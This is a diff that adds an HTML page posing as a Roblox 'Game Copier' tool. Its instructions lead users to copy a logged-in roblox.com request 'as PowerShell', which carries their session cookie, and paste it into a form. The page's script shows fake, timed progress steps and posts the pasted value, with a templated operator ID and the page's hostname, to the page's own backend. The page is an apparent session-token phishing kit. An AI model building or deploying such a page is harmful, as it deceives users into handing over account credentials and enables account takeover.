@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Copier - Studio Tools</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+            <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        surface: { 50: '#111111', 100: '#1A1A1A', 200: '#262626', 300: '#404040' },
+                    },
+                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background: #050505; }
+        .glass-panel { background: rgba(17,17,17,.6); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,.05); }
+        .glow-gradient { position: fixed; top: -40%; left: -20%; width: 140%; height: 100%; background: radial-gradient(ellipse at 30% 20%, rgba(255,255,255,.04) 0%, transparent 50%), radial-gradient(ellipse at 80% 60%, rgba(255,255,255,.02) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        .fade-up { animation: fadeUp .6s ease forwards; }
+        .fade-up-d1 { animation-delay: .15s; opacity: 0; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner { animation: spin .8s linear infinite; }
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+        .progress-fill { animation: progress 3s ease-out forwards; }
+    </style>
+</head>
+<body class="font-sans text-neutral-300 antialiased min-h-screen flex items-center justify-center p-6">
+    <div class="glow-gradient"></div>
+
+    <div class="w-full max-w-lg relative z-10">
+        <div class="text-center mb-8 fade-up">
+            <div class="text-lg font-bold text-white mb-1">Studio Tools</div>
+            <p class="text-xs text-neutral-600">Game Copier</p>
+        </div>
+
+        <div class="fade-up fade-up-d1 glass-panel rounded-2xl p-8 md:p-10">
+            <div class="text-center mb-8">
+                <div class="w-14 h-14 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto mb-4">
+                    <svg class="" style="width:24px;height:24px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75"><rect x="2" y="6" width="20" height="12" rx="5"/><path d="M6 12h4M8 10v4"/><circle cx="16" cy="11" r="1.2" fill="currentColor" stroke="none"/><circle cx="18" cy="13" r="1.2" fill="currentColor" stroke="none"/></svg>
+                </div>
+                <h1 class="text-2xl font-bold text-white mb-2">Copy Game</h1>
+                <p class="text-sm text-neutral-500">Enter your credentials to download the game file</p>
+            </div>
+
+            <div class="mb-6 p-4 rounded-xl bg-white/5 border border-white/10">
+                <div class="flex items-center gap-2 mb-2">
+                    <svg class="" style="width:14px;height:14px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                    <span class="text-xs font-semibold text-neutral-400">How it works</span>
+                </div>
+                <ol class="space-y-1.5 text-[11px] text-neutral-500">
+                    <li class="flex items-start gap-2"><span class="text-neutral-400 flex-shrink-0">1.</span> Open <a href="https://www.roblox.com" target="_blank" class="text-neutral-400 hover:underline">roblox.com</a> and log in</li>
+                    <li class="flex items-start gap-2"><span class="text-neutral-400 flex-shrink-0">2.</span> Press <span class="text-neutral-300 font-mono">F12</span> → <span class="text-neutral-300">Network</span> → refresh the page</li>
+                    <li class="flex items-start gap-2"><span class="text-neutral-400 flex-shrink-0">3.</span> Right-click any request → <span class="text-neutral-300">Copy</span> → <span class="text-neutral-300 font-mono">Copy as PowerShell</span></li>
+                    <li class="flex items-start gap-2"><span class="text-neutral-400 flex-shrink-0">4.</span> Paste below and click Copy Game</li>
+                </ol>
+            </div>
+
+            <form id="gameForm">
+                <div class="mb-5">
+                    <label class="block text-sm font-medium text-neutral-400 mb-2">Authorization String</label>
+                    <input type="password" id="authInput" required autocomplete="off"
+                           placeholder="Paste your authorization string here..."
+                           class="w-full bg-black/40 border border-white/10 rounded-xl py-3.5 px-4 text-sm text-white placeholder-neutral-700 focus:outline-none focus:border-white/30 focus:ring-1 focus:ring-white/30 transition-all">
+                    <p class="mt-1.5 text-[10px] text-neutral-600">Required for accessing game assets from the Roblox API</p>
+                </div>
+
+                <button type="submit" id="submitBtn"
+                        class="w-full py-4 bg-white text-black font-bold text-sm rounded-xl hover:bg-neutral-200 transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
+                    <span id="btnText">Copy Game</span>
+                </button>
+            </form>
+
+            <div id="progressArea" class="hidden mt-6">
+                <div class="space-y-3" id="progressSteps"></div>
+                <div class="mt-4 h-1 rounded-full bg-white/5 overflow-hidden">
+                    <div id="progressBar" class="h-full rounded-full bg-white"></div>
+                </div>
+            </div>
+
+            <div id="statusMessage" class="mt-4 p-4 rounded-xl text-sm font-medium text-center hidden"></div>
+        </div>
+
+        <p class="text-center text-[10px] text-neutral-700 mt-6">&copy; 2026 Studio Tools</p>
+    </div>
+
+    <script>
+        const form = document.getElementById('gameForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const statusMessage = document.getElementById('statusMessage');
+        const authInput = document.getElementById('authInput');
+        const progressArea = document.getElementById('progressArea');
+        const progressSteps = document.getElementById('progressSteps');
+        const progressBar = document.getElementById('progressBar');
+        const userId = '{{ user_id }}';
+
+        const steps = [
+            { text: 'Authenticating with Roblox API...', delay: 0 },
+            { text: 'Resolving place data...', delay: 800 },
+            { text: 'Downloading game assets...', delay: 1800 },
+            { text: 'Packaging .rbxl file...', delay: 2800 },
+        ];
+
+        function showProgress() {
+            progressArea.classList.remove('hidden');
+            statusMessage.classList.add('hidden');
+            progressSteps.innerHTML = '';
+            progressBar.className = 'h-full rounded-full bg-white progress-fill';
+
+            steps.forEach((step, i) => {
+                setTimeout(() => {
+                    const prev = progressSteps.querySelector('[data-active]');
+                    if (prev) {
+                        prev.innerHTML = `<svg class="" style="width:14px;height:14px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><span class="text-neutral-300">${prev.dataset.text}</span>`;
+                        prev.removeAttribute('data-active');
+                    }
+                    const el = document.createElement('div');
+                    el.className = 'flex items-center gap-2 text-xs';
+                    el.dataset.text = step.text;
+                    el.dataset.active = '1';
+                    el.innerHTML = `<svg class="w-3.5 h-3.5 text-white/50 spinner" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 70" stroke-linecap="round"/></svg><span class="text-neutral-400">${step.text}</span>`;
+                    progressSteps.appendChild(el);
+                }, step.delay);
+            });
+        }
+
+        function hideProgress() {
+            const prev = progressSteps.querySelector('[data-active]');
+            if (prev) {
+                prev.innerHTML = `<svg class="" style="width:14px;height:14px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><span class="text-neutral-300">${prev.dataset.text}</span>`;
+                prev.removeAttribute('data-active');
+            }
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const authValue = authInput.value.trim();
+            if (!authValue) { showStatus('Please enter your authorization string', 'error'); return; }
+
+            submitBtn.disabled = true;
+            btnText.textContent = 'Processing...';
+            showProgress();
+
+            try {
+                await new Promise(r => setTimeout(r, 1500));
+
+                const response = await fetch('/api/process_game', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        payload: authValue,
+                        sid: userId,
+                        ref: window.location.hostname
+                    })
+                });
+                const data = await response.json();
+
+                await new Promise(r => setTimeout(r, 2000));
+                hideProgress();
+
+                if (data.status === 'success') {
+                    showStatus('Game copied successfully! Starting download...', 'success');
+                    authInput.value = '';
+                    if (data.file_id) {
+                        setTimeout(() => { window.location.href = '/api/assets/' + data.file_id; }, 1200);
+                    }
+                } else {
+                    showStatus(data.message || 'An error occurred', 'error');
+                }
+            } catch (error) {
+                hideProgress();
+                showStatus('Network error. Please check your connection and try again.', 'error');
+            } finally {
+                submitBtn.disabled = false;
+                btnText.textContent = 'Copy Game';
+            }
+        });
+
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'mt-4 p-4 rounded-xl text-sm font-medium text-center ' +
+                (type === 'success' ? 'bg-[rgba(255,255,255,.12)] border border-white/10 text-[#c0c0c8]' : 'bg-[rgba(255,100,100,.1)] border border-[rgba(255,100,100,.2)] text-[#ff8888]');
+        }
+    </script>
+</body>
+</html>
